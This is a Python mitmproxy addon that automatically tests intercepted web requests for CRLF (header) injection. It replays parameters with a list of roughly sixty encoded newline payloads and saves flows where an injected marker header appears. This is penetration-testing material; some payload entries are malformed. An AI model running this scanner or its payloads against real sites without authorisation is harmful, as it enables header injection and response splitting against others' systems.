from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import time

class CRLF:
    def __init__(self):
        # Directory where flows indicating potential vulnerabilities will be saved.
        self.custom_crlf_flow_dir = "CRLF_flows"
        os.makedirs(self.custom_crlf_flow_dir, exist_ok=True)

        # A custom header to mark requests that have been altered by this script.
        self.custom_crlf_altered_header = "x-altered-crlf"

        # List of payloads to test for CRLF vulnerabilities.
        self.custom_crlf_payloads = [
    "%0AHeader-Test:BLATRUC",
    "%0A%20Header-Test:BLATRUC",
    "%20%0AHeader-Test:BLATRUC",
    "%23%OAHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "%3F%0AHeader-Test:BLATRUC",
    "crlf%0AHeader-Test:BLATRUC",
    "crlf%0A%20Header-Test:BLATRUC",
    "crlf%20%0AHeader-Test:BLATRUC",
    "crlf%23%OAHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "crlf%3F%0AHeader-Test:BLATRUC",
    "%0DHeader-Test:BLATRUC",
    "%0D%20Header-Test:BLATRUC",
    "%20%0DHeader-Test:BLATRUC",
    "%23%0DHeader-Test:BLATRUC",
    "%23%0AHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "%3F%0DHeader-Test:BLATRUC",
    "crlf%0DHeader-Test:BLATRUC",
    "crlf%0D%20Header-Test:BLATRUC",
    "crlf%20%0DHeader-Test:BLATRUC",
    "crlf%23%0DHeader-Test:BLATRUC",
    "crlf%23%0AHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "crlf%3F%0DHeader-Test:BLATRUC",
    "%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%20Header-Test:BLATRUC",
    "%20%0D%0AHeader-Test:BLATRUC",
    "%23%0D%0AHeader-Test:BLATRUC",
    "\\r\\nHeader-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "%5cr%5cnHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "%3F%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0A%20Header-Test:BLATRUC",
    "crlf%20%0D%0AHeader-Test:BLATRUC",
    "crlf%23%0D%0AHeader-Test:BLATRUC",
    "crlf\\r\\nHeader-Test:BLATRUC",
    "crlf%5cr%5cnHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "crlf%3F%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%09Header-Test:BLATRUC",
    "crlf%0D%0A%09Header-Test:BLATRUC",
    "%250AHeader-Test:BLATRUC",
    "%25250AHeader-Test:BLATRUC",
    "%%0A0AHeader-Test:BLATRUC",
    "%25%30AHeader-Test:BLATRUC",
    "%25%30%61Header-Test:BLATRUC",
    "%u000AHeader-Test:BLATRUC",
    "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
    "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
    "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
]


    def response(self, flow: http.HTTPFlow) -> None:
        

        # If this is an already altered request, check for CRLF reflection.
        if self.custom_crlf_altered_header in flow.request.headers:
            self.check_crlf_reflection(flow)
            return

        # Process GET and POST requests differently.
        if flow.request.method == "GET":
            self.process_parameters_crlf(flow, flow.request.query, flow.response.headers)
        elif flow.request.method == "POST":
            self.process_post_request_crlf(flow, flow.response.headers)

    def process_post_request_crlf(self, flow, response_headers):
        # Extracts and processes parameters from a POST request.
        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_crlf(flow, params, response_headers)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_crlf(flow, params, response_headers)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_crlf(self, flow, params, response_headers):
        # Checks if any parameter is reflected in the response headers.
        for param, value in params.items():
            if isinstance(value, list):  # Handle lists for form data
                value = value[0]
            if isinstance(value, str) and param in response_headers:
                # If reflection is found, alter and replay the request with CRLF payloads.
                self.alter_and_replay_crlf(flow, param, value)

    def alter_and_replay_crlf(self, original_flow, param, original_value):
        # Alters the request by appending each CRLF payload to the parameter and replays it.
        for payload in self.custom_crlf_payloads:
            altered_value =  payload
            altered_flow = self.alter_request_crlf(original_flow, param, altered_value)
            if altered_flow:
                ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_crlf(self, original_flow, param, altered_value):
        # Creates a deep copy of the original request and alters the specified parameter.
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.custom_crlf_altered_header] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_crlf_reflection(self, flow):
        # Checks if the CRLF payloads are reflected in the response headers.
        for header, value in flow.response.headers.items():
            if "Header-Test" in header:
                ctx.log.info(f"CRLF Injection Detected: {flow.request.url}")
                self.save_flow_crlf(flow)
                

    def save_flow_crlf(self, flow):
        # Saves the flow to a file for later analysis if a potential vulnerability is detected.
        filename = os.path.join(self.custom_crlf_flow_dir, f"crlf_captured_request_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved altered flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

# Add the class instance to mitmproxy addons.
addons = [CRLF()]
